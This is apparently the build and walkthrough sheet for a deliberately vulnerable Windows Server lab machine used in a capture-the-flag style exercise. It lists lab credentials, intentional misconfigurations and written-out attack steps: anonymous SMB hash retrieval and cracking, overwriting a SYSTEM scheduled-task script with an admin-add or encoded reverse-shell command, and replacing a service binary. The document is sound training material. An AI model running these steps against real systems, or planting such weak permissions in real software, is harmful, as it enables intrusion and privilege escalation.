# Orbital

> Orbital is a Windows file processing and scheduling server used by Sunspire's operations team.

---

## Overview

| Property | Value |
|----------|-------|
| Difficulty | Medium |
| OS | Windows Server 2022 |
| Services | SMB, MSSQL, RDP |
| Initial Access | Anonymous SMB Share |
| Privilege Escalation | Scheduled Task (world-writable script), Weak Service Permissions |
| Lateral Movement | .rdp file → helios |

---

## Users

| Username | Password | Notes |
|----------|----------|-------|
| orbital | securepassword | MD5 hash in SMB share |
| ops | 9ksP311p | |
| Administrator | 5EVB7Zmp | |

---

## Services

### SMB (Anonymous Share)
- Share name: `public`
- Share path: `C:\Shares\public`
- Anonymous/guest access enabled
- Contains `hashes.txt` with MD5 password hashes

### Remote Desktop (RDP)
- Listening on port `:3389`
- Network Level Authentication (NLA) disabled
- All users can RDP (orbital, ops, Administrator)

### SunSpire Backup Agent
- Service name: `SunspireBackup`
- Path: `C:\Program Files\Sunspire Backup\backup.exe`
- backup.exe has weak permissions

---

## Attack Vectors

### Initial Access

#### Option 1: Anonymous SMB Share
The public SMB share contains MD5 hashes that can be cracked.

1. Enumerate SMB shares:
   ```bash
   smbclient -L //<target_ip>/ -N
   ```
2. Connect to public share:
   ```bash
   smbclient //<target_ip>/public -N
   ```
3. Download hashes file:
   ```bash
   get hashes.txt
   ```
4. Crack the MD5 hash for orbital user:
   ```bash
   # 6d7fce9fee471194aa8b5b6e47267f03 = securepassword
   hashcat -m 0 hashes.txt /path/to/wordlist
   ```
5. RDP as orbital user:
   ```bash
   xfreerdp /v:<target_ip> /u:orbital /p:securepassword
   ```

---

### Privilege Escalation

#### Option 1: Scheduled Task (SolarTelemetry)
A scheduled task runs a world-writable PowerShell script as SYSTEM every 3 minutes.

1. Check the scheduled task:
   ```powershell
   Get-ScheduledTask -TaskName "SolarTelemetry"
   ```
2. Verify script permissions:
   ```powershell
   icacls C:\Sunspire\telemetry.ps1
   # Everyone has FullControl
   ```
3. Replace script with malicious payload:
   ```powershell
   # Add your user to Administrators
   Set-Content -Path "C:\Sunspire\telemetry.ps1" -Value 'net localgroup Administrators orbital /add'
   
   # Or create a reverse shell
   Set-Content -Path "C:\Sunspire\telemetry.ps1" -Value 'powershell -e <base64_payload>'
   ```
4. Wait up to 3 minutes for the task to execute as SYSTEM

#### Option 2: Weak Service Permissions (SunspireBackup)
The SunspireBackup service executable is located in a world-writable directory.

1. Check service path:
   ```powershell
   wmic service get name,displayname,pathname | findstr /i "Sunspire"
   # Shows: C:\Program Files\Sunspire Backup\backup.exe
   ```
2. The Sunspire Backup directory is writable
   ```powershell
   # Since C:\Program Files\Sunspire Backup is writable
   copy evil.exe "C:\Program Files\Sunspire Backup\Backup.exe"
   ```
4. Restart the service or wait for system reboot:
   ```powershell
   Restart-Service SunspireBackup

   ```

---

### Lateral Movement

#### .rdp File → helios
An RDP connection file in the orbital user's Documents folder provides access to helios.

1. Navigate to orbital's Documents:
   ```powershell
   dir C:\Users\orbital\Documents\
   ```
2. Find the RDP file:
   ```
   helios-admin.rdp
   ```
3. Double-click to connect to helios, and open the file extract pyre user password (base64 encoded):
   ```powershell
   type C:\Users\orbital\Documents\helios-admin.rdp
   ```
4. The RDP file connects as the `pyre` user to helios

---

## Scoring

### Services
- [ ] SMB (Anonymous share on :445)

### Control Files
- [ ] `C:\Administrator\ctrl.txt`
- [ ] `C:\Users\orbital\ctrl.txt`

---

## File Locations

| Purpose | Path |
|---------|------|
| SMB Share | C:\Shares\public |
| Password Hashes | C:\Shares\public\hashes.txt |
| Backup Agent | C:\Program Files\Sunspire Backup\backup.exe |
| Telemetry Script | C:\Sunspire\telemetry.ps1 |
| Telemetry Log | C:\Sunspire\telemetry.log |
| RDP File | C:\Users\orbital\Documents\helios-admin.rdp |
| Admin Control File | C:\Administrator\ctrl.txt |
| Orbital Control File | C:\Users\orbital\ctrl.txt |

---

## MSSQL Database

### SunSpire Database
The SQL Server contains a `SunSpire` database with solar panel data:

| Table | Description |
|-------|-------------|
| SolarPanels | Panel inventory (serial numbers, locations, capacity) |
| PanelTelemetry | Sensor readings (voltage, current, temperature) |
| MaintenanceLog | Maintenance records |
| DailyProduction (view) | Aggregated daily production stats |

### Sample Queries
```sql
USE SunSpire;
SELECT * FROM SolarPanels;
SELECT TOP 10 * FROM PanelTelemetry ORDER BY Timestamp DESC;
```

---

## Installation Notes

1. Run `deploy.ps1` first to set up users, SMB, scheduled task, etc.
2. Run `Install-MSSQL.ps1` separately to install SQL Server
3. MSSQL installation downloads ~1.5GB ISO and takes 10-15 minutes

---

## Notes

- Windows Firewall is completely disabled
- Windows Defender real-time monitoring is disabled
- Server Manager auto-start is disabled
- NLA is disabled for RDP
